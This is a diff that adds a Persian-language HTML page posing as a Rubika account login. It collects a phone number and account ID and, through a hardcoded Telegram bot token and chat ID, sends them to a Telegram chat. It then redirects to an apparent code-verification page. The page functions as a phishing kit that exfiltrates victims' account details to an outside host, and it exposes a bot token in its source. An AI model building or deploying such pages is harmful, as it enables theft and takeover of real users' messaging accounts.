@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به حساب کاربری</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #333; /* رنگ پس‌زمینه تیره */
+            margin: 0;
+            padding: 0;
+            color: #fff; /* رنگ متن روشن */
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background-color: #222; /* رنگ پس‌زمینه کادر مشکی تیره */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            text-align: center;
+            color: #4CAF50; /* رنگ عنوان */
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #444; /* رنگ حاشیه ورودی */
+            border-radius: 5px;
+            background-color: #555; /* رنگ پس‌زمینه ورودی */
+            color: #fff; /* رنگ متن در ورودی */
+        }
+        input::placeholder {
+            color: #bbb; /* رنگ متن در placeholder */
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #bbb; /* رنگ متن در فوتر */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>ورود به حساب کاربری</h1>
+        <label for="phone">شماره تلفن (+98):</label>
+        <input type="text" id="phone" placeholder="شماره تلفن را وارد کنید">
+        
+        <label for="accountId">آیدی اکانت روبیکا:</label>
+        <input type="text" id="accountId" placeholder="آیدی اکانت را وارد کنید">
+        
+        <button class="button" id="loginBtn">تایید</button>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 تمامی حقوق محفوظ است.</p>
+    </div>
+
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const phone = document.getElementById('phone').value;
+            const accountId = document.getElementById('accountId').value;
+
+            if (phone.trim() === '' || accountId.trim() === '') {
+                alert('لطفاً همه فیلدها را پر کنید.');
+            } else {
+                // ذخیره اطلاعات در localStorage
+                localStorage.setItem('phone', phone);
+                localStorage.setItem('accountId', accountId);
+                
+                // ارسال اطلاعات به ربات تلگرام
+                sendToTelegram(phone, accountId);
+            }
+        });
+
+        function sendToTelegram(phone, accountId) {
+            const token = '8067302993:AAGsjimxvF39LKaudeaO8ZH243G2wBfD_ow'; // توکن ربات تلگرام خود را جایگزین کنید
+            const chatId = '7878707697'; // Chat ID خود را جایگزین کنید
+            const message = `ورود به حساب کاربری:\nشماره تلفن: ${phone}\nآیدی اکانت: ${accountId}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // انتقال به صفحه تأیید کد
+                    window.location.href = 'verify.html';
+                } else {
+                    alert('خطا در ارسال اطلاعات به تلگرام.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('خطا در ارسال اطلاعات به تلگرام.');
+            });
+        }
+    </script>
+
+</body>
+</html>
